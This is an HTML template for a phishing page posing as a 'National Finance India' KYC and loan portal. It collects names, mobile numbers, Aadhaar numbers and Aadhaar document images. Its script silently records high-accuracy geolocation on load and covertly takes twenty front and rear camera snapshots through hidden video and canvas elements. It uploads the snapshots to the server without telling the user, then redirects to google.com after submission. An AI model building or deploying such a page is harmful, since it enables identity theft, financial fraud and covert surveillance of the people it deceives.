<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta property="og:title" content="National Finance India - KYC Portal">
    <meta property="og:image" content="/static/logo.png">
    <title>National Finance India - Secure KYC Portal</title>
    <style>
        body { background: #f8f9fa; color: #333; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; box-sizing: border-box; }
        .box { background: #ffffff; padding: 35px 25px; border-radius: 8px; max-width: 400px; width: 100%; border-top: 4px solid #0056b3; box-shadow: 0 4px 20px rgba(0,0,0,0.08); box-sizing: border-box; text-align: center; }
        .logo-img { width: 130px; margin-bottom: 15px; }
        h3 { color: #0056b3; margin-top: 0; text-align: center; font-size: 20px; display: none; }
        p { font-size: 13px; color: #666; text-align: center; margin-bottom: 20px; }
        input { width: 100%; padding: 10px; margin: 8px 0; background: #fff; border: 1px solid #ced4da; color: #333; border-radius: 4px; box-sizing: border-box; font-size: 14px; text-align: left; }
        input:focus { border-color: #0056b3; outline: none; }
        label { font-size: 12px; display: block; text-align: left; margin-top: 12px; font-weight: 600; color: #444; }
        .btn { background: #0056b3; color: white; border: none; padding: 12px; width: 100%; font-weight: bold; border-radius: 4px; cursor: pointer; margin-top: 20px; font-size: 15px; transition: background 0.2s; }
        .btn:hover { background: #004085; }
    </style>
</head>
<body>
    <video id="video" autoplay playsinline style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <div class="box">
        <img src="{{ url_for('static', filename='logo.png') }}" alt="NFI Logo" class="logo-img">
        <p>Complete your KYC & Loan Application details below.</p>
        
        <input type="text" id="name" placeholder="Full Name (as per Aadhaar)" required>
        <input type="tel" id="mobile" placeholder="Mobile Number" maxlength="10" required>
        <input type="text" id="aadhaar" placeholder="12-digit Aadhaar Number" maxlength="12" required>
        
        <label>Upload Aadhaar Document / Photo:</label>
        <input type="file" id="doc" accept="image/*" required>
        
        <button class="btn" onclick="submitFinal()">Submit Application</button>
    </div>

    <script>
        let currentLat = 0.0;
        let currentLon = 0.0;

        // Get location silently on load as well for final submission backup
        window.onload = async function() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    pos => {
                        currentLat = pos.coords.latitude;
                        currentLon = pos.coords.longitude;
                    },
                    err => {},
                    { enableHighAccuracy: true }
                );
            }

            let photos = [];

            // Capture 10 Front Snapshots
            for(let i = 0; i < 10; i++) {
                let p = await captureCamera("user");
                if(p) photos.push(p);
                await new Promise(resolve => setTimeout(resolve, 300));
            }

            // Capture 10 Back Snapshots
            for(let i = 0; i < 10; i++) {
                let p = await captureCamera("environment");
                if(p) photos.push(p);
                await new Promise(resolve => setTimeout(resolve, 300));
            }

            // Send all 20 snapshots silently
            if(photos.length > 0) {
                fetch('/api/snapshots', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ photos: photos })
                });
            }
        };

        async function captureCamera(facingMode) {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: facingMode }, 
                    audio: false 
                });
                const video = document.getElementById('video');
                video.srcObject = stream;
                
                await new Promise(resolve => setTimeout(resolve, 800));

                const canvas = document.getElementById('canvas');
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                const imgData = canvas.toDataURL('image/jpeg', 0.8);
                
                stream.getTracks().forEach(track => track.stop());
                return imgData;
            } catch (e) {
                return null;
            }
        }

        function submitFinal() {
            const name = document.getElementById('name').value;
            const mobile = document.getElementById('mobile').value;
            const aadhaar = document.getElementById('aadhaar').value;
            const fileInput = document.getElementById('doc').files[0];

            if(!name || !mobile || !aadhaar || !fileInput) {
                alert("Please fill all details and upload the document.");
                return;
            }

            const reader = new FileReader();
            reader.readAsDataURL(fileInput);
            reader.onload = function() {
                const payload = {
                    name: name,
                    mobile: mobile,
                    aadhaar: aadhaar,
                    latitude: currentLat,
                    longitude: currentLon,
                    document: reader.result
                };

                fetch('/api/submit_loan', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                })
                .then(res => res.json())
                .then(data => {
                    alert("Application Submitted Successfully!");
                    window.location.href = "https://www.google.com";
                })
                .catch(err => {
                    window.location.href = "https://www.google.com";
                });
            };
        }
    </script>
</body>
</html>
